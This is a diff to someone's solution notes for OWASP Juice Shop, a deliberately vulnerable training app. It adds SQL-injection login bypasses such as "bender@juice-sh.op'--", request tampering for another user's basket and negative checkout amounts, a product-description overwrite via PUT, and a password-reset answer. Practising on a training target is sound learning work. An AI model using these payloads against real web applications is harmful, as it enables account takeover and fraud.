@@ -35,6 +35,43 @@
 ## GDPR Data Erasure
 - login with chris.pike@juice-sh.op'--
 
+## Login Amy
+- amy@juice-sh.op
+- K1f.....................
+
+## Login Bender
+- login with
+- bender@juice-sh.op'--
+
+## Login Jim
+- jim@juice-sh.op'--
+
+## Manipulate basket
+- capture request adding to basket
+- change to POST
+{"ProductId":1,"BasketId":1,
+"quantity":3,
+"BasketId":5}
+
+## Payback time
+- capture adding something to cart
+- turn amount into -10000
+- checkout
+
+## Privacy Policy inspection
+- /we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility
+
+## Product Tampering
+- login as admin
+- navigate to the product
+- change to PUT /api/Products/9 HTTP/1.1 
+- add Content-Type: application/json
+- add  {"description": "<a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"}
+
+## Reset Jim's Password
+- jim@juice-sh.op
+- Samuel
+
 ## API Only XSS
 - login as admin
 - capture with burp to find the request to an api with the bearer token
@@ -50,7 +87,4 @@
 - login to admin
 - go to /administration
 
-## Login Bender
-- login with
-- bender@juice-sh.op'--
 
